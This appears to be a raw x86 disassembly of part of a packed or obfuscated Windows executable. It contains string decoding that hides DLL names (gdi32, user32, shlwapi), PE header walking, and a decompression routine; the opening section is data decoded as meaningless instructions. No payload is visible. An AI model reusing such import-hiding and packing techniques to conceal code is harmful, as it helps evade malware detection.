  423c8b:	pop    ss
  423c8c:	(bad)  
  423c8d:	stc    
  423c8e:	mov    edx,0x8bdfdf85
  423c93:	xor    al,0xcc
  423c95:	jnp    0x423c36
  423c97:	repnz cli 
  423c99:	push   0xeacffe2c
  423c9e:	fs push ebx
  423ca0:	adc    BYTE PTR [ebx],0x7e
  423ca3:	xor    eax,DWORD PTR [ebp+0x7431732b]
  423ca9:	dec    ebx
  423caa:	adc    bh,BYTE PTR ds:0x1456e989
  423cb0:	shr    bl,1
  423cb2:	fst    DWORD PTR [eax]
  423cb4:	cmc    
  423cb5:	mov    bl,0xc9
  423cb7:	jmp    FWORD PTR [ebp+0x45]
  423cba:	xor    dh,BYTE PTR [esi+ebp*2]
  423cbd:	bound  eax,QWORD PTR [esi-0x25]
  423cc0:	xchg   bh,bl
  423cc2:	mov    ah,0x49
  423cc4:	push   edx
  423cc5:	ins    BYTE PTR es:[edi],dx
  423cc6:	mov    ecx,DWORD PTR [edx+0x6eafd787]
  423ccc:	and    eax,DWORD PTR [ebx+0x7]
  423ccf:	out    dx,eax
  423cd0:	xor    al,0x5f
  423cd2:	test   al,0xa7
  423cd4:	push   ebx
  423cd5:	fld    DWORD PTR ds:0x965bf5
  423cdb:	xor    DWORD PTR [esi-0x42],ecx
  423cde:	fcmovbe st,st(4)
  423ce0:	iret   
  423ce1:	xor    eax,0xc8ac0de3
  423ce6:	inc    ebx
  423ce7:	sub    bl,BYTE PTR [ebx]
  423ce9:	push   ecx
  423cea:	and    DWORD PTR [eax-0x49],ecx
  423ced:	pop    edx
  423cee:	xchg   ebx,eax
  423cef:	cmp    al,cl
  423cf1:	cli    
  423cf2:	pop    ds
  423cf3:	lods   eax,DWORD PTR ds:[esi]
  423cf4:	cwde   
  423cf5:	mov    ebp,DWORD PTR [ebx-0x501a540c]
  423cfb:	inc    eax
  423cfc:	push   ds
  423cfd:	dec    eax
  423cfe:	dec    esi
  423cff:	loope  0x423cbd
  423d01:	sbb    eax,0xfc4844fe
  423d06:	cmp    al,0xa1
  423d08:	bound  eax,QWORD PTR [edi-0x2dd7bc34]
  423d0e:	sub    BYTE PTR [esi+0x4688c975],al
  423d14:	dec    esp
  423d15:	and    BYTE PTR [ebp-0x70d8b2fe],cl
  423d1b:	std    
  423d1c:	add    ah,bh
  423d1e:	scas   eax,DWORD PTR es:[edi]
  423d1f:	add    eax,0xea3fd584
  423d24:	jbe    0x423d9b
  423d26:	stos   DWORD PTR es:[edi],eax
  423d27:	loopne 0x423d10
  423d29:	test   al,0xdc
  423d2b:	jg     0x423ccf
  423d2d:	in     al,dx
  423d2e:	jmp    0xfd61:0x99da4d5d
  423d35:	mov    eax,ds:0x380fe253
  423d3a:	adc    eax,0xeb2672c3
  423d3f:	sbb    DWORD PTR [eax],0x31
  423d42:	icebp  
  423d43:	inc    esi
  423d44:	mov    ds:0x7673e399,al
  423d49:	push   ebx
  423d4a:	out    dx,al
  423d4b:	test   al,0x68
  423d4d:	inc    esi
  423d4e:	stos   BYTE PTR es:[edi],al
  423d4f:	cmp    edi,DWORD PTR [eax]
  423d51:	fild   DWORD PTR [esi+eiz*8+0x14]
  423d55:	mov    bh,BYTE PTR es:[ebx+esi*8+0x511afb16]
  423d5d:	add    BYTE PTR [eax],dl
  423d5f:	out    dx,al
  423d60:	mov    BYTE PTR [ecx-0x74],dl
  423d63:	inc    eax
  423d64:	sub    BYTE PTR [ecx+0x4cbf8cc5],dh
  423d6a:	(bad)  
  423d6b:	shl    DWORD PTR [ecx+0x3e79a3f6],cl
  423d71:	ss cdq 
  423d73:	sbb    bl,BYTE PTR [ebx-0x71]
  423d76:	idiv   BYTE PTR [eax-0x75]
  423d79:	divps  xmm1,XMMWORD PTR ds:0x96a6f232
  423d80:	lea    ecx,es:[esi]
  423d83:	inc    ecx
  423d84:	pop    ebx
  423d85:	mov    dl,0x15
  423d87:	ja     0x423d14
  423d89:	xchg   edi,eax
  423d8a:	mov    BYTE PTR [ecx],bh
  423d8c:	push   ecx
  423d8d:	jnp    0x423d3e
  423d8f:	pop    edx
  423d90:	in     al,0x58
  423d92:	aad    0x81
  423d94:	scas   al,BYTE PTR es:[edi]
  423d95:	inc    ebp
  423d96:	mov    edx,DWORD PTR [edi]
  423d98:	xor    BYTE PTR [ebp+0x12a86ac9],al
  423d9e:	xlat   BYTE PTR ds:[ebx]
  423d9f:	jmp    0xb3b9:0x66c3d6b9
  423da6:	(bad)  [ebx+0x6fe7019c]
  423dac:	cdq    
  423dad:	(bad)  
  423dae:	pushf  
  423daf:	dec    esi
  423db0:	mov    WORD PTR [edi+0x796d173e],ds
  423db6:	loope  0x423d9d
  423db8:	mov    edi,0x64375fc8
  423dbd:	mov    dh,0xb6
  423dbf:	jo     0x423d50
  423dc1:	call   0x45f0:0x48649a95
  423dc8:	aas    
  423dc9:	data16 sti 
  423dcb:	lds    edi,FWORD PTR [ebp-0xeb004b2]
  423dd1:	adc    al,0xd2
  423dd3:	push   ecx
  423dd4:	adc    eax,0xd36d0ca4
  423dd9:	cmp    DWORD PTR [bx+di+0x2fe6],ebp
  423dde:	adc    DWORD PTR [edi],ebx
  423de0:	and    BYTE PTR [esi],ch
  423de2:	xchg   ebx,eax
  423de3:	neg    DWORD PTR [edx+0x317fd4f3]
  423de9:	loope  0x423dce
  423deb:	or     cl,BYTE PTR [ebx+0x4168ba3a]
  423df1:	push   ebx
  423df2:	mov    ebp,0x7a012a30
  423df7:	inc    ecx
  423df8:	fiadd  DWORD PTR [ebx-0x58]
  423dfb:	dec    edi
  423dfc:	add    eax,0x5fbcbc07
  423e01:	jae    0x423d8e
  423e03:	inc    ebp
  423e04:	or     BYTE PTR [edi],cl
  423e06:	mov    esi,0x72f6ba00
  423e0b:	xor    al,BYTE PTR [eax]
  423e0d:	sub    eax,edx
  423e0f:	mov    ecx,0x75108af
  423e14:	xor    eax,ecx
  423e16:	cmp    eax,0xf89c85f8
  423e1b:	mov    DWORD PTR ds:0x428e97,0x5a9f
  423e25:	jne    0x423e8a
  423e2b:	mov    eax,DWORD PTR [ebp+0x8]
  423e2e:	push   esi
  423e2f:	or     DWORD PTR ds:0x428e8b,edx
  423e35:	mov    esi,DWORD PTR [ebp+0x8]
  423e38:	add    esi,DWORD PTR [eax+0x3c]
  423e3b:	sbb    DWORD PTR ds:0x428e23,0x3013
  423e45:	mov    DWORD PTR [ebp+0x8],esi
  423e48:	sbb    DWORD PTR ds:0x428e6b,0x1c7d
  423e52:	mov    eax,DWORD PTR [ebp-0x4]
  423e55:	mov    esi,DWORD PTR ds:0x428e6b
  423e5b:	adc    esi,DWORD PTR ds:0x428e2f
  423e61:	mov    DWORD PTR ds:0x428e6b,esi
  423e67:	mov    esi,DWORD PTR [ebp+0x8]
  423e6a:	adc    DWORD PTR ds:0x428ecf,0x428ea3
  423e74:	xor    eax,ecx
  423e76:	add    eax,edx
  423e78:	cmp    DWORD PTR [esi+0x54],eax
  423e7b:	pop    esi
  423e7c:	je     0x423e8a
  423e82:	mov    eax,DWORD PTR [ebp+0x8]
  423e85:	jmp    0x423e91
  423e8a:	mov    eax,DWORD PTR [ebp-0x4]
  423e8d:	xor    eax,ecx
  423e8f:	add    eax,edx
  423e91:	leave  
  423e92:	ret    0x4
  423e95:	push   ebp
  423e96:	mov    ebp,esp
  423e98:	sub    esp,0xc
  423e9b:	push   esi
  423e9c:	or     DWORD PTR ds:0x428eaf,ebx
  423ea2:	mov    esi,0xf89c85a5
  423ea7:	and    DWORD PTR ds:0x428e97,0x0
  423eb1:	jmp    0x423ec3
  423eb6:	mov    edx,DWORD PTR ds:0x428e97
  423ebc:	inc    edx
  423ebd:	mov    DWORD PTR ds:0x428e97,edx
  423ec3:	cmp    DWORD PTR ds:0x428e97,0x10
  423eca:	jae    0x423f0a
  423ed0:	cmp    DWORD PTR ds:0x428e97,0x8
  423ed7:	jg     0x423f0a
  423edd:	jmp    0x423eeb
  423ee2:	push   DWORD PTR [ebp-0x20]
  423ee5:	call   DWORD PTR ds:0x42a9eb
  423eeb:	cmp    DWORD PTR ds:0x428e97,0x7
  423ef2:	jne    0x423f05
  423ef8:	mov    edx,DWORD PTR ds:0x428e97
  423efe:	inc    edx
  423eff:	mov    DWORD PTR ds:0x428e97,edx
  423f05:	jmp    0x423eb6
  423f0a:	mov    DWORD PTR [ebp-0x8],esi
  423f0d:	and    DWORD PTR ds:0x428e67,0x0
  423f17:	jmp    0x423f29
  423f1c:	mov    edx,DWORD PTR ds:0x428e67
  423f22:	inc    edx
  423f23:	mov    DWORD PTR ds:0x428e67,edx
  423f29:	cmp    DWORD PTR ds:0x428e67,0x1a
  423f30:	jae    0x423f78
  423f36:	cmp    DWORD PTR ds:0x428e67,0x4
  423f3d:	jle    0x423f78
  423f43:	jmp    0x423f59
  423f48:	push   DWORD PTR [ebp-0x18]
  423f4b:	push   0x428e67
  423f50:	push   DWORD PTR [ebp-0x18]
  423f53:	call   DWORD PTR ds:0x42a9ef
  423f59:	cmp    DWORD PTR ds:0x428e67,0x3
  423f60:	jne    0x423f73
  423f66:	mov    edx,DWORD PTR ds:0x428e67
  423f6c:	inc    edx
  423f6d:	mov    DWORD PTR ds:0x428e67,edx
  423f73:	jmp    0x423f1c
  423f78:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  423f7f:	push   edi
  423f80:	adc    DWORD PTR ds:0x428e87,0x34d1
  423f8a:	mov    eax,eax
  423f8c:	mov    eax,DWORD PTR [ebp-0x4]
  423f8f:	movzx  edx,BYTE PTR ds:0x428e97
  423f96:	add    DWORD PTR ds:0x428ecf,edx
  423f9c:	mov    edi,DWORD PTR [ebp-0x8]
  423f9f:	mov    ecx,DWORD PTR ds:0x429767
  423fa5:	mov    ecx,DWORD PTR [ecx]
  423fa7:	sub    DWORD PTR ds:0x428ecb,ecx
  423fad:	mov    ecx,0x75108af
  423fb2:	xor    eax,ecx
  423fb4:	xor    edi,ecx
  423fb6:	mov    edx,0x3272f6
  423fbb:	add    edi,edx
  423fbd:	add    eax,edx
  423fbf:	imul   eax,edi
  423fc2:	mov    edi,DWORD PTR [ebp+0xc]
  423fc5:	cmp    edi,eax
  423fc7:	je     0x42401c
  423fcd:	mov    DWORD PTR [ebp-0xc],esi
  423fd0:	mov    eax,DWORD PTR [ebp-0xc]
  423fd3:	mov    esi,DWORD PTR [ebp+0xc]
  423fd6:	xor    eax,ecx
  423fd8:	lea    eax,[eax*8+0x1939828]
  423fdf:	mov    eax,DWORD PTR [esi+eax*1]
  423fe2:	mov    DWORD PTR [ebp+0xc],eax
  423fe5:	mov    eax,DWORD PTR [ebp-0x4]
  423fe8:	mov    esi,DWORD PTR [ebp-0x8]
  423feb:	xor    eax,ecx
  423fed:	xor    esi,ecx
  423fef:	add    esi,edx
  423ff1:	add    eax,edx
  423ff3:	imul   eax,esi
  423ff6:	mov    esi,DWORD PTR [ebp+0xc]
  423ff9:	cmp    esi,eax
  423ffb:	je     0x42401c
  424001:	mov    eax,DWORD PTR [ebp-0x4]
  424004:	xor    eax,ecx
  424006:	mov    ecx,DWORD PTR [ebp+0xc]
  424009:	add    eax,edx
  42400b:	imul   eax,ecx
  42400e:	add    eax,DWORD PTR [ebp+0x8]
  424011:	mov    DWORD PTR [ebp+0xc],eax
  424014:	mov    eax,DWORD PTR [ebp+0xc]
  424017:	jmp    0x42402d
  42401c:	mov    eax,DWORD PTR [ebp-0x4]
  42401f:	mov    esi,DWORD PTR [ebp-0x8]
  424022:	xor    esi,ecx
  424024:	xor    eax,ecx
  424026:	add    esi,edx
  424028:	add    eax,edx
  42402a:	imul   eax,esi
  42402d:	pop    edi
  42402e:	pop    esi
  42402f:	leave  
  424030:	ret    0x8
	...
  424043:	add    BYTE PTR [ebp-0x44],al
  424046:	mov    edi,0x4d
  42404b:	add    BYTE PTR [edx],al
  42404d:	add    BYTE PTR [eax],al
  42404f:	add    BYTE PTR [ecx+0x0],al
  424052:	add    BYTE PTR [eax],al
  424054:	pusha  
  424055:	inc    eax
  424056:	add    al,BYTE PTR [eax]
  424058:	pusha  
  424059:	xor    al,0x2
  42405b:	add    BYTE PTR [eax],al
  42405d:	add    BYTE PTR [eax],al
  42405f:	add    BYTE PTR [edx+0x53],dl
  424062:	inc    esp
  424063:	push   ebx
  424064:	cs push ecx
  424066:	loope  0x42408a
  424068:	in     eax,0xfd
  42406a:	push   esi
  42406b:	inc    esi
  42406c:	mov    bl,0xa3
  42406e:	pop    ss
  42406f:	or     edi,ecx
  424071:	ret    
  424072:	and    eax,0x1b5
  424077:	add    BYTE PTR [ebx+0x3a],al
  42407a:	pop    esp
  42407b:	inc    esi
  42407c:	outs   dx,DWORD PTR ds:[esi]
  42407d:	ins    BYTE PTR es:[edi],dx
  42407e:	fs gs jb 0x4240a2
  424082:	outs   dx,DWORD PTR ds:[esi]
  424083:	data16 and BYTE PTR [edi+0x6f],dl
  424087:	jb     0x4240f4
  424089:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  424090:	push   0x65
  424092:	arpl   WORD PTR [esp+ebx*2+0x50],si
  424096:	jb     0x424107
  424098:	push   0x65
  42409a:	arpl   WORD PTR [esp+edx*2+0x65],si
  42409e:	jae    0x424114
  4240a0:	add    BYTE PTR [ebx-0x137e13ab],cl
  4240a6:	or     BYTE PTR [ecx],al
  4240a8:	add    BYTE PTR [eax],al
  4240aa:	push   ebx
  4240ab:	mov    eax,ebx
  4240ad:	xchg   ecx,eax
  4240ae:	mov    eax,DWORD PTR [ebp+0x8]
  4240b1:	cmp    eax,0xf89c85a5
  4240b6:	jne    0x424542
  4240bc:	mov    eax,DWORD PTR [ebp+0xc]
  4240bf:	cmp    eax,0xf89c85a4
  4240c4:	jne    0x424542
  4240ca:	mov    eax,DWORD PTR [ebp+0x24]
  4240cd:	mov    DWORD PTR [ebp-0x4],eax
  4240d0:	mov    eax,DWORD PTR [ebp-0x4]
  4240d3:	mov    eax,DWORD PTR [eax+0x1d8]
  4240d9:	mov    eax,DWORD PTR [eax]
  4240db:	mov    eax,DWORD PTR [eax]
  4240dd:	mov    DWORD PTR [ebp-0x8],eax
  4240e0:	mov    BYTE PTR [ebp-0x18],0x1c
  4240e4:	mov    BYTE PTR [ebp-0x17],0x1f
  4240e8:	mov    BYTE PTR [ebp-0x16],0x1a
  4240ec:	mov    BYTE PTR [ebp-0x15],0x50
  4240f0:	mov    BYTE PTR [ebp-0x14],0x51
  4240f4:	mov    BYTE PTR [ebp-0x13],0x83
  4240f8:	mov    BYTE PTR [ebp-0x20],0xe
  4240fc:	mov    BYTE PTR [ebp-0x1f],0x10
  424100:	mov    BYTE PTR [ebp-0x1e],0x1e
  424104:	mov    BYTE PTR [ebp-0x1d],0x11
  424108:	mov    BYTE PTR [ebp-0x1c],0x50
  42410c:	mov    BYTE PTR [ebp-0x1b],0x51
  424110:	mov    BYTE PTR [ebp-0x1a],0x83
  424114:	mov    BYTE PTR [ebp-0x28],0x10
  424118:	mov    BYTE PTR [ebp-0x27],0x1b
  42411c:	mov    BYTE PTR [ebp-0x26],0x17
  424120:	mov    BYTE PTR [ebp-0x25],0xc
  424124:	mov    BYTE PTR [ebp-0x24],0x22
  424128:	mov    BYTE PTR [ebp-0x23],0x13
  42412c:	mov    BYTE PTR [ebp-0x22],0x1a
  424130:	mov    BYTE PTR [ebp-0x21],0x83
  424134:	xor    ecx,ecx
  424136:	lea    eax,[ebp+ecx*1-0x18]
  42413a:	movzx  edx,BYTE PTR [eax]
  42413d:	xor    edx,0x7f
  424140:	add    edx,0x4
  424143:	inc    ecx
  424144:	mov    BYTE PTR [eax],dl
  424146:	cmp    ecx,0x6
  424149:	jb     0x424136
  42414b:	xor    ecx,ecx
  42414d:	lea    eax,[ebp+ecx*1-0x20]
  424151:	movzx  edx,BYTE PTR [eax]
  424154:	xor    edx,0x7f
  424157:	add    edx,0x4
  42415a:	inc    ecx
  42415b:	mov    BYTE PTR [eax],dl
  42415d:	cmp    ecx,0x7
  424160:	jb     0x42414d
  424162:	xor    ecx,ecx
  424164:	lea    eax,[ebp+ecx*1-0x28]
  424168:	movzx  edx,BYTE PTR [eax]
  42416b:	xor    edx,0x7f
  42416e:	add    edx,0x4
  424171:	inc    ecx
  424172:	mov    BYTE PTR [eax],dl
  424174:	cmp    ecx,0x8
  424177:	jb     0x424164
  424179:	lea    eax,[ebp-0x2c]
  42417c:	mov    DWORD PTR [ebp-0x8],eax
  42417f:	mov    ecx,DWORD PTR [ebp-0x8]
  424182:	mov    eax,0x7113fccf
  424187:	push   esi
  424188:	mov    DWORD PTR [ecx],eax
  42418a:	mov    ecx,DWORD PTR [ebp-0x2c]
  42418d:	mov    esi,0x4e38
  424192:	push   edi
  424193:	lea    edi,[esi-0x6]
  424196:	mov    ebx,0x3272f6
  42419b:	cmp    ecx,eax
  42419d:	jne    0x42426e
  4241a3:	lea    eax,[esi+0x3f]
  4241a6:	mov    WORD PTR [ebp-0x78],ax
  4241aa:	mov    eax,esi
  4241ac:	mov    WORD PTR [ebp-0x76],ax
  4241b0:	add    eax,0x45
  4241b3:	mov    WORD PTR [ebp-0x74],ax
  4241b7:	lea    eax,[esi+0x6]
  4241ba:	mov    WORD PTR [ebp-0x72],ax
  4241be:	add    eax,0x41
  4241c1:	mov    WORD PTR [ebp-0x70],ax
  4241c5:	mov    eax,edi
  4241c7:	mov    WORD PTR [ebp-0x6e],ax
  4241cb:	mov    eax,0x4f94
  4241d0:	mov    WORD PTR [ebp-0x6c],ax
  4241d4:	lea    eax,[esi-0x7]
  4241d7:	mov    WORD PTR [ebp-0x6a],ax
  4241db:	add    eax,0x30
  4241de:	mov    WORD PTR [ebp-0x68],ax
  4241e2:	lea    eax,[esi-0x3]
  4241e5:	mov    WORD PTR [ebp-0x66],ax
  4241e9:	mov    eax,esi
  4241eb:	mov    WORD PTR [ebp-0x64],ax
  4241ef:	add    eax,0xfffffffc
  4241f2:	mov    WORD PTR [ebp-0x62],ax
  4241f6:	mov    eax,0x443
  4241fb:	mov    WORD PTR [ebp-0x60],ax
  4241ff:	mov    eax,0x5672
  424204:	mov    WORD PTR [ebp-0x5e],ax
  424208:	mov    eax,0x6112
  42420d:	mov    WORD PTR [ebp-0x5c],ax
  424211:	mov    eax,0xf1e0
  424216:	mov    WORD PTR [ebp-0x5a],ax
  42421a:	mov    eax,edi
  42421c:	mov    WORD PTR [ebp-0x58],ax
  424220:	lea    eax,[ebp-0xe0]
  424226:	push   eax
  424227:	mov    eax,DWORD PTR [ebp+0xc]
  42422a:	xor    eax,0x75108af
  42422f:	add    eax,ebx
  424231:	push   eax
  424232:	lea    eax,[ebp-0x78]
  424235:	push   eax
  424236:	mov    eax,DWORD PTR [ebp-0x4]
  424239:	mov    eax,DWORD PTR [eax+0x198]
  42423f:	mov    DWORD PTR [ebp-0xe0],0x1
  424249:	mov    DWORD PTR [ebp-0xdc],0xffff
  424253:	push   DWORD PTR [eax]
  424255:	mov    eax,DWORD PTR [ebp+0x10]
  424258:	call   eax
  42425a:	mov    DWORD PTR [ebp-0x8],eax
  42425d:	mov    eax,DWORD PTR [ebp-0x8]
  424260:	test   eax,eax
  424262:	je     0x42426e
  424264:	xor    DWORD PTR ds:0xe041cc1,0x9f170bd0
  42426e:	mov    eax,DWORD PTR [ebp-0x4]
  424271:	mov    ecx,DWORD PTR [eax+0x18c]
  424277:	xor    eax,eax
  424279:	cmp    DWORD PTR [ecx],eax
  42427b:	jne    0x4244b2
  424281:	mov    ecx,DWORD PTR [ebp-0x4]
  424284:	mov    ecx,DWORD PTR [ecx+0x17c]
  42428a:	mov    DWORD PTR [ecx],eax
  42428c:	mov    ecx,DWORD PTR [ebp-0x4]
  42428f:	mov    ecx,DWORD PTR [ecx+0x180]
  424295:	mov    DWORD PTR [ecx],eax
  424297:	mov    eax,0x4e6d
  42429c:	mov    WORD PTR [ebp-0x9c],ax
  4242a3:	mov    eax,esi
  4242a5:	mov    WORD PTR [ebp-0x9a],ax
  4242ac:	mov    eax,0x4e7d
  4242b1:	mov    WORD PTR [ebp-0x98],ax
  4242b8:	add    eax,0xffffffc0
  4242bb:	mov    WORD PTR [ebp-0x96],ax
  4242c2:	mov    eax,0x4f88
  4242c7:	mov    WORD PTR [ebp-0x94],ax
  4242ce:	mov    eax,0x4e3c
  4242d3:	mov    WORD PTR [ebp-0x92],ax
  4242da:	mov    eax,esi
  4242dc:	mov    WORD PTR [ebp-0x8c],ax
  4242e3:	mov    eax,0x4e31
  4242e8:	mov    WORD PTR [ebp-0x8a],ax
  4242ef:	mov    eax,0x99fd
  4242f4:	mov    WORD PTR [ebp-0x88],ax
  4242fb:	mov    eax,0x8d6c
  424300:	mov    WORD PTR [ebp-0x86],ax
  424307:	mov    eax,0xd66f
  42430c:	mov    WORD PTR [ebp-0x84],ax
  424313:	mov    BYTE PTR [ebp-0x10],0x10
  424317:	mov    eax,0xd783
  42431c:	mov    WORD PTR [ebp-0x82],ax
  424323:	mov    BYTE PTR [ebp-0xf],0x1b
  424327:	mov    eax,0x2782
  42432c:	mov    BYTE PTR [ebp-0xe],0x17
  424330:	mov    WORD PTR [ebp-0x80],ax
  424334:	mov    BYTE PTR [ebp-0xd],0xc
  424338:	mov    eax,0x4782
  42433d:	mov    BYTE PTR [ebp-0xc],0x22
  424341:	mov    WORD PTR [ebp-0x7e],ax
  424345:	mov    eax,0x4e33
  42434a:	mov    BYTE PTR [ebp-0xb],0x13
  42434e:	push   0x8
  424350:	mov    BYTE PTR [ebp-0xa],0x1a
  424354:	mov    WORD PTR [ebp-0x7c],ax
  424358:	mov    BYTE PTR [ebp-0x9],0x83
  42435c:	mov    DWORD PTR [ebp-0x90],0x4e324e61
  424366:	lea    eax,[ebp-0x10]
  424369:	pop    edi
  42436a:	movzx  ecx,BYTE PTR [eax]
  42436d:	xor    ecx,0x7f
  424370:	add    ecx,0x4
  424373:	mov    BYTE PTR [eax],cl
  424375:	inc    eax
  424376:	dec    edi
  424377:	jne    0x42436a
  424379:	mov    DWORD PTR [ebp-0xe0],0x1
  424383:	lea    eax,[ebp-0x10]
  424386:	mov    DWORD PTR [ebp-0xdc],eax
  42438c:	mov    ecx,0x4e60
  424391:	mov    eax,ecx
  424393:	mov    WORD PTR [ebp-0x40],ax
  424397:	add    eax,0xb
  42439a:	mov    edx,eax
  42439c:	mov    WORD PTR [ebp-0x3e],dx
  4243a0:	mov    edx,0x4f93
  4243a5:	mov    WORD PTR [ebp-0x3c],dx
  4243a9:	add    edx,0xfffffff8
  4243ac:	mov    WORD PTR [ebp-0x3a],dx
  4243b0:	mov    edx,0x4f89
  4243b5:	mov    WORD PTR [ebp-0x38],dx
  4243b9:	add    edx,0x5
  4243bc:	mov    WORD PTR [ebp-0x36],dx
  4243c0:	mov    edx,0x4f87
  4243c5:	mov    WORD PTR [ebp-0x34],dx
  4243c9:	mov    WORD PTR [ebp-0x32],cx
  4243cd:	mov    ecx,esi
  4243cf:	mov    WORD PTR [ebp-0x30],cx
  4243d3:	lea    ecx,[edx-0x7]
  4243d6:	mov    edx,ecx
  4243d8:	mov    WORD PTR [ebp-0x54],dx
  4243dc:	mov    edx,eax
  4243de:	mov    WORD PTR [ebp-0x52],dx
  4243e2:	mov    edx,0x4e73
  4243e7:	mov    WORD PTR [ebp-0x50],dx
  4243eb:	mov    WORD PTR [ebp-0x4e],ax
  4243ef:	lea    eax,[edx-0xa]
  4243f2:	mov    WORD PTR [ebp-0x4c],ax
  4243f6:	add    eax,0x5
  4243f9:	mov    WORD PTR [ebp-0x4a],ax
  4243fd:	lea    eax,[edx-0xc]
  424400:	mov    WORD PTR [ebp-0x48],ax
  424404:	mov    WORD PTR [ebp-0x46],cx
  424408:	mov    WORD PTR [ebp-0x44],si
  42440c:	mov    ecx,DWORD PTR [ebp+0x8]
  42440f:	movzx  edx,WORD PTR [ebp-0x54]
  424413:	mov    eax,0x75108af
  424418:	xor    ecx,eax
  42441a:	add    ecx,ebx
  42441c:	xor    ecx,edx
  42441e:	mov    WORD PTR [ebp-0x54],cx
  424422:	mov    ecx,DWORD PTR [ebp+0x8]
  424425:	xor    ecx,eax
  424427:	movzx  eax,WORD PTR [ebp-0x40]
  42442b:	add    ecx,ebx
  42442d:	xor    ecx,eax
  42442f:	xor    eax,eax
  424431:	mov    WORD PTR [ebp-0x40],cx
  424435:	mov    WORD PTR [ebp-0xf4],ax
  42443c:	mov    WORD PTR [ebp-0x108],ax
  424443:	mov    edi,DWORD PTR [ebp+0x24]
  424446:	lea    eax,[ebp-0xf4]
  42444c:	lea    edx,[ebp-0x54]
  42444f:	mov    DWORD PTR [ebp-0xe0],0x2
  424459:	mov    DWORD PTR [ebp-0xdc],eax
  42445f:	call   0x426ea1
  424464:	mov    ecx,DWORD PTR [ebp+0x8]
  424467:	mov    DWORD PTR [ebp-0xd8],eax
  42446d:	mov    eax,0x75108af
  424472:	xor    ecx,eax
  424474:	add    ecx,ebx
  424476:	je     0x424495
  424478:	lea    ecx,[ebp-0xe0]
  42447e:	push   ecx
  42447f:	mov    ecx,DWORD PTR [ebp+0xc]
  424482:	xor    ecx,eax
  424484:	add    ecx,ebx
  424486:	push   ecx
  424487:	lea    eax,[ebp-0x9c]
  42448d:	push   eax
  42448e:	mov    eax,DWORD PTR [ebp+0x10]
  424491:	push   0x0
  424493:	call   eax
  424495:	mov    edi,DWORD PTR [ebp+0x24]
  424498:	lea    eax,[ebp-0x108]
  42449e:	lea    edx,[ebp-0x40]
  4244a1:	mov    DWORD PTR [ebp-0xdc],eax
  4244a7:	call   0x426ea1
  4244ac:	mov    DWORD PTR [ebp-0xd8],eax
  4244b2:	mov    eax,DWORD PTR [ebp+0x14]
  4244b5:	push   DWORD PTR [ebp-0x4]
  4244b8:	push   DWORD PTR [ebp+0x20]
  4244bb:	push   DWORD PTR [ebp+0x1c]
  4244be:	push   DWORD PTR [ebp+0x18]
  4244c1:	push   DWORD PTR [ebp+0x10]
  4244c4:	push   DWORD PTR [ebp+0x8]
  4244c7:	push   DWORD PTR [ebp+0xc]
  4244ca:	call   0x425742
  4244cf:	test   eax,eax
  4244d1:	je     0x424518
  4244d3:	add    DWORD PTR [ebp-0x4],eax
  4244d6:	push   DWORD PTR [ebp-0x4]
  4244d9:	lea    esi,[ebp+0x4]
  4244dc:	call   0x424930
  4244e1:	mov    eax,DWORD PTR [ebp-0x4]
  4244e4:	mov    eax,DWORD PTR [eax+0x1c8]
  4244ea:	mov    eax,DWORD PTR [eax]
  4244ec:	xor    eax,0x75108af
  4244f1:	add    eax,ebx
  4244f3:	mov    eax,DWORD PTR [ebp-0x4]
  4244f6:	jne    0x42450e
  4244f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4244fb:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424501:	push   DWORD PTR [ecx]
  424503:	mov    eax,DWORD PTR [eax+0x1e0]
  424509:	call   DWORD PTR [eax+0x28]
  42450c:	jmp    0x424518
  42450e:	mov    eax,DWORD PTR [eax+0x17c]
  424514:	mov    eax,DWORD PTR [eax]
  424516:	add    DWORD PTR [esi],eax
  424518:	mov    eax,DWORD PTR [ebp-0x4]
  42451b:	mov    eax,DWORD PTR [eax+0x1dc]
  424521:	dec    DWORD PTR [eax]
  424523:	mov    ecx,DWORD PTR [ebp-0x4]
  424526:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42452c:	mov    eax,DWORD PTR [eax]
  42452e:	lea    eax,[ecx+eax*4]
  424531:	mov    ecx,DWORD PTR [ebp-0x4]
  424534:	mov    ecx,DWORD PTR [ecx+0x17c]
  42453a:	mov    eax,DWORD PTR [eax]
  42453c:	mov    ecx,DWORD PTR [ecx]
  42453e:	add    DWORD PTR [eax],ecx
  424540:	pop    edi
  424541:	pop    esi
  424542:	pop    ebx
  424543:	leave  
  424544:	ret    0x20
  424547:	push   edi
  424548:	push   esi
  424549:	push   ebx
  42454a:	push   ebp
  42454b:	mov    ebp,esp
  42454d:	mov    eax,DWORD PTR [ebp+0x24]
  424550:	add    DWORD PTR [ebp+0x28],eax
  424553:	push   eax
  424554:	cld    
  424555:	mov    esi,DWORD PTR [ebp+0x18]
  424558:	add    DWORD PTR [ebp+0x1c],esi
  42455b:	push   esi
  42455c:	mov    esi,DWORD PTR [ebp+0x14]
  42455f:	lods   eax,DWORD PTR ds:[esi]
  424560:	xchg   edx,eax
  424561:	push   edx
  424562:	mov    cl,BYTE PTR [esi-0x2]
  424565:	or     eax,0xffffffff
  424568:	shl    eax,cl
  42456a:	not    eax
  42456c:	push   eax
  42456d:	mov    cl,dh
  42456f:	or     eax,0xffffffff
  424572:	shl    eax,cl
  424574:	not    eax
  424576:	push   eax
  424577:	add    cl,dl
  424579:	mov    edi,esi
  42457b:	sub    esp,0xc
  42457e:	sub    eax,eax
  424580:	inc    eax
  424581:	push   eax
  424582:	push   eax
  424583:	push   eax
  424584:	push   eax
  424585:	push   eax
  424586:	push   edi
  424587:	sub    esi,esi
  424589:	push   esi
  42458a:	or     ebx,0xffffffff
  42458d:	mov    eax,0x300
  424592:	shl    eax,cl
  424594:	lea    ecx,[eax+0x736]
  42459a:	mov    eax,0x4000400
  42459f:	shr    ecx,1
  4245a1:	rep stos DWORD PTR es:[edi],eax
  4245a3:	push   0x5
  4245a5:	pop    ecx
  4245a6:	call   0x424891
  4245ab:	loop   0x4245a6
  4245ad:	lea    esi,[esi]
  4245af:	lea    edi,[edi]
  4245b1:	mov    edi,DWORD PTR [ebp-0x4]
  4245b4:	mov    eax,DWORD PTR [ebp-0x10]
  4245b7:	sub    edi,DWORD PTR [ebp+0x24]
  4245ba:	and    eax,edi
  4245bc:	mov    DWORD PTR [ebp-0x18],eax
  4245bf:	mov    al,0x0
  4245c1:	call   0x4248a9
  4245c6:	jne    0x424661
